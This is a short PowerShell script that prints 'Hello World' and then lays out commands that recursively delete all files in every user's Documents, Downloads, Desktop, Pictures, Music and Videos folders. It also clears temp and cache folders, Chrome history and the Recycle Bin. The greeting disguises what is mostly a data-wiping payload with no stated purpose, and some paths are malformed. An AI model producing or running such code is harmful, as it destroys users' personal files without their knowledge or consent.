Write-Output "Hello World"

{
    Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Downloads) -Recurse} | %{Remove-Item $_.FullName -Verbose}
    Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Documents) -Recurse} | %{Remove-Item $_.FullName -Verbose}
    Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Music) -Recurse} | %{Remove-Item $_.FullName -Verbose}
    Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Videos) -Recurse} | %{Remove-Item $_.FullName -Verbose}
    Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Pictures) -Recurse} | %{Remove-Item $_.FullName -Verbose}
    Get-ChildItem "C:\Users" | ?{ $_.PSIsContainer }  | % {gci (Join-Path $_.FullName Desktop) -Recurse} | %{Remove-Item $_.FullName -Verbose}

}


  {
   
    del C:\Users\mobile\AppData\Local\Temp\*.*
    del C:\Documents and Settings\Local Settings\Temporary Internet Files\*.*
    del C:\Documents and Settings\Local Settings\Temp\*.*
    del C:\Users\AppData\Local\Temp\*.*
    del C:\Users\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*
    del "C:\Users\mobile\AppData\Local\Google\Chrome\User Data\Default\History"
   
  }
     {

        del 'C:\$Recycle.Bin'

     } 

